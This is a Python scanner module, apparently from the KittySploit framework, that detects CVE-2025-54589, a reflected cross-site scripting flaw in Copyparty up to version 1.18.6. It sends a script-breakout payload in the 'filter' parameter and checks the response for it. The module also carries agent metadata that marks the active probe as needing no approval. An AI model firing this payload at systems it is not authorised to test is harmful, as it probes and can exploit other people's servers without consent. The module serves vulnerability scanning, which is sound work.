#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Copyparty before 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Copyparty <=1.18.6 - Cross-Site Scripting Detection',
        'description': "Copyparty before 1.18.7 is vulnerable to reflected cross-site scripting (XSS) via the 'filter' parameter in the '/?ru' endpoint. Unsanitized user input is reflected in the HTML response, allowing attackers to execute arbitrary JavaScript in the context of the victim's browser.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'xss', 'copyparty', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/9001/copyparty',
            'https://secalerts.co/vulnerability/CVE-2025-54589',
            'https://github.com/9001/copyparty/security/advisories/GHSA-8mx2-rjh8-q3jq',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-54589',
        ],
        'cve': 'CVE-2025-54589',
    }

    def run(self):
        path = '/?ru&filter=%3C%2Fscript%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = ('filter": "</script><script>alert(document.domain)</script>', 'control-panel',)
        ctype_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='medium',
                reason='Copyparty <=1.18.6 - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

